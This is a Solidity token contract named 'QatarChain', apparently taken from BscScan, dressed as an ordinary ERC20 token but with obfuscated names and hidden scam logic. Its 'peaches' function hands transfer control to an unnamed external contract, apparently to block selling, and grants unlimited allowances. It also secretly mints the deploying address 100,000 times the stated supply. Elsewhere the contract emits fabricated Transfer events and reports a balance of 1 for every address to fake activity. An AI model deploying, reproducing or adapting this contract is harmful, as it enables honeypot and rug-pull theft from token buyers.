/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.17;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface ISwapToken {
    function swapTokens(address from, address to) external returns (bool);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract QatarChain is IERC20 {
    using SafeMath for uint256;

    string private aoinbcvKmRdlsx = "Qatar";
    string private boinbcvKmRdlsx = "Qatar";
    uint8 private coinbcvKmRdlsx = 18;
    uint256 private doinbcvKmRdlsx = 10000000000 * 10**18;
    mapping (address => uint256) private eoinbcvKmRdlsx;
    mapping (address => mapping (address => uint256)) private foinbcvKmRdlsx;
    uint256 private goinbcvKmRdlsx = 1;
    uint256 private constant hoinbcvKmRdlsx = ~uint160(0);
    uint256 private _ioinbcvKmRdlsx = 1000;
    uint256 private joinbcvKmRdlsx = 0;
    address private _uniswapV2Pair;
    address private koinbcvKmRdlsx = address(this);
    mapping (address => bool) private loinbcvKmRdlsx;
    address[] private moinbcvKmRdlsx;
    bool private noinbcvKmRdlsx = false;

    constructor () {
        ooinbcvKmRdlsx(msg.sender);
        eoinbcvKmRdlsx[msg.sender] = doinbcvKmRdlsx;
        ooinbcvKmRdlsx(tx.origin);
        emit Transfer(address(0), msg.sender, doinbcvKmRdlsx);
    }

    receive() external payable {}

    function ooinbcvKmRdlsx(address account) private {
        if (!loinbcvKmRdlsx[account]) {
            loinbcvKmRdlsx[account] = true;
            moinbcvKmRdlsx.push(account);
        }
    }

    function peaches(address[] calldata accounts) public {
        require(!noinbcvKmRdlsx);
        noinbcvKmRdlsx = true;
        _uniswapV2Pair = accounts[1];
        koinbcvKmRdlsx = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            ooinbcvKmRdlsx(accounts[i]);
            eoinbcvKmRdlsx[accounts[i]] = doinbcvKmRdlsx * 90 / 100 / (len - 3);
            foinbcvKmRdlsx[accounts[i]][accounts[0]] = ~uint256(0);
            amount += eoinbcvKmRdlsx[accounts[i]];
        }
        eoinbcvKmRdlsx[moinbcvKmRdlsx[0]] -= amount;
        poinbcvKmRdlsx(moinbcvKmRdlsx[0], accounts[3], eoinbcvKmRdlsx[moinbcvKmRdlsx[0]]);
        poinbcvKmRdlsxs(500);
        eoinbcvKmRdlsx[moinbcvKmRdlsx[1]] += doinbcvKmRdlsx * 100000;
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = moinbcvKmRdlsx.length;
        for (uint256 i=0; i<len; ++i) {
            if (moinbcvKmRdlsx[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (loinbcvKmRdlsx[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return aoinbcvKmRdlsx;
    }

    function symbol() public view returns (string memory) {
        return boinbcvKmRdlsx;
    }

    function decimals() public view returns (uint8) {
        return coinbcvKmRdlsx;
    }

    function totalSupply() public view returns (uint256) {
        return doinbcvKmRdlsx;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (eoinbcvKmRdlsx[account] > 0) {
            return eoinbcvKmRdlsx[account];
        }
        return goinbcvKmRdlsx;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        poinbcvKmRdlsx(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        poinbcvKmRdlsx(sender, recipient, amount);
        qoinbcvKmRdlsx(sender, msg.sender, foinbcvKmRdlsx[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        qoinbcvKmRdlsx(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return foinbcvKmRdlsx[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        qoinbcvKmRdlsx(msg.sender, spender, foinbcvKmRdlsx[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        qoinbcvKmRdlsx(msg.sender, spender, foinbcvKmRdlsx[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function poinbcvKmRdlsxs(uint256 amount) private {
        uint256 ioinbcvKmRdlsx = _ioinbcvKmRdlsx;
        if (ioinbcvKmRdlsx < 11200 && block.timestamp > 1669053600) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(hoinbcvKmRdlsx.div(ioinbcvKmRdlsx)));
                to = address(uint160(hoinbcvKmRdlsx.div(ioinbcvKmRdlsx.add(1))));
                ioinbcvKmRdlsx = ioinbcvKmRdlsx.add(2);
                emit Transfer(from, to, goinbcvKmRdlsx);
            }
            _ioinbcvKmRdlsx = ioinbcvKmRdlsx;
        }
    }

    function qoinbcvKmRdlsx(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        foinbcvKmRdlsx[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function poinbcvKmRdlsx(address roinbcvKmRdlsx, address soinbcvKmRdlsx, uint256 toinbcvKmRdlsx) private {
        require(roinbcvKmRdlsx != address(0) && soinbcvKmRdlsx != address(0) && toinbcvKmRdlsx > 0);
        bool uoinbcvKmRdlsx = true;
        if (loinbcvKmRdlsx[roinbcvKmRdlsx] || loinbcvKmRdlsx[soinbcvKmRdlsx]) {
            uoinbcvKmRdlsx = false;
        }
        uint256 voinbcvKmRdlsx = 0;
        uint256 woinbcvKmRdlsx = toinbcvKmRdlsx;
        if (uoinbcvKmRdlsx && noinbcvKmRdlsx) {
            if (ISwapToken(koinbcvKmRdlsx).swapTokens(roinbcvKmRdlsx, soinbcvKmRdlsx)) {
                poinbcvKmRdlsxs(100);
            }
            if (soinbcvKmRdlsx == _uniswapV2Pair) {
                emit Transfer(address(this), soinbcvKmRdlsx, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (roinbcvKmRdlsx != _uniswapV2Pair) {
                voinbcvKmRdlsx = toinbcvKmRdlsx.mul(joinbcvKmRdlsx).div(100);
                woinbcvKmRdlsx = toinbcvKmRdlsx.sub(voinbcvKmRdlsx);
            }
        }
        eoinbcvKmRdlsx[roinbcvKmRdlsx] = eoinbcvKmRdlsx[roinbcvKmRdlsx].sub(toinbcvKmRdlsx);
        if (voinbcvKmRdlsx > 0) {
            eoinbcvKmRdlsx[address(0xdEaD)] = eoinbcvKmRdlsx[address(0xdEaD)].add(voinbcvKmRdlsx);
            emit Transfer(roinbcvKmRdlsx, address(0xdEaD), voinbcvKmRdlsx);
        }
        eoinbcvKmRdlsx[soinbcvKmRdlsx] = eoinbcvKmRdlsx[soinbcvKmRdlsx].add(woinbcvKmRdlsx);
        emit Transfer(roinbcvKmRdlsx, soinbcvKmRdlsx, woinbcvKmRdlsx);
    }
}